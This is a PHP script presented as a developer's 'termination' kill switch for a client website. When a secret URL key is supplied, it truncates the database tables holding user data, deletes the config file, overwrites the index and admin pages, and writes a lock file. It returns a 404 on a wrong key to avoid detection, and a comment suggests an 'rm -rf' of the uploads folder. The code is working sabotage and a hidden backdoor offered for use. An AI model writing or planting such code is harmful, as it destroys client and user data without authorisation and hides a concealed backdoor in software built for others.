<?php
/**
 * Developer Assurance Protocol - Termination Script
 * 
 * FOR DEVELOPER USE ONLY.
 * This script permanently disables the website in the event of a contract breach.
 * It is designed to be triggered via a secret URL and will perform the following actions:
 * 1. Truncate all critical database tables, destroying all user data.
 * 2. Delete the primary configuration file (config.php), breaking all database connectivity.
 * 3. Overwrite index.php and admin.php with a termination notice.
 * 4. Create a .lock file to prevent the site from functioning even if files are restored.
 * 
 * This action is irreversible.
 * 
 */

// --- CONFIGURATION ---
// Define a secret key. Change this to a long, random string.
define('TERMINATION_KEY', '');

// --- SCRIPT LOGIC ---
// Additional security: Check for specific header or IP whitelist
// Uncomment and configure if you want IP-based access control
/*
$allowed_ips = ['YOUR_IP_ADDRESS_HERE'];
$client_ip = $_SERVER['REMOTE_ADDR'] ?? '';
if (!in_array($client_ip, $allowed_ips)) {
    die('Access Denied.');
}
*/

// Check if the script is being accessed with the correct key.
if (!isset($_GET['key']) || $_GET['key'] !== TERMINATION_KEY) {
    // If not, die silently to prevent detection.
    http_response_code(404); // Return 404 instead of revealing file exists
    die('Not Found.');
}

// The key is correct. Begin termination sequence.
// We need to include the config file to connect to the database one last time.
if (file_exists(__DIR__ . '/../config.php')) {
    require_once __DIR__ . '/../config.php';

    try {
        // Connect to the database
        $pdo = new PDO(
            "mysql:host=" . DB_HOST . ";dbname=" . DB_NAME . ";charset=utf8mb4",
            DB_USER,
            DB_PASS,
            [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
        );

        // List of tables to truncate. This is more destructive than dropping.
        $tablesToTruncate = [
        // configure to your liking
        ];

        // Disable foreign key checks to allow truncation
        $pdo->exec("SET FOREIGN_KEY_CHECKS=0");

        foreach ($tablesToTruncate as $table) {
            // Use TRUNCATE TABLE for speed and to reset AUTO_INCREMENT
            $pdo->exec("TRUNCATE TABLE `" . $table . "`");
        }

        // Re-enable foreign key checks
        $pdo->exec("SET FOREIGN_KEY_CHECKS=1");

    } catch (PDOException $e) {
        // If the database connection fails, we'll continue with file deletion.
        // The goal is to disable the site by any means necessary.
        error_log("Termination Script DB Error: " . $e->getMessage());
    }
}

// Now, attack the file system.
 $rootPath = __DIR__ . '/..';

// 1. Delete the main config file. This is critical.
if (file_exists($rootPath . '/config.php')) {
    unlink($rootPath . '/config.php');
}

// 2. Overwrite index.php with a termination message.
 $terminationMessage = "<h1>Website Terminated</h1><p>This website has been permanently disabled by the developer.</p>";
file_put_contents($rootPath . '/index.php', $terminationMessage);

// 3. Overwrite admin.php with the same message.
file_put_contents($rootPath . '/admin.php', $terminationMessage);

// 4. Create the .lock file. This is the final nail in the coffin.
// The main admin.php will check for this file on every load.
 $lockFileContent = "Site terminated by developer on " . date('Y-m-d H:i:s');
file_put_contents($rootPath . '/.site_terminated.lock', $lockFileContent);

// Optional: You could also add code here to delete the entire uploads directory, etc.
// For example: `exec("rm -rf " . escapeshellarg($rootPath . '/uploads'));`
// Be EXTREMELY careful with such commands.

// Finally, display a confirmation message and die.
die('<h1>Termination Sequence Complete.</h1><p>The website has been permanently disabled.</p>');

?>
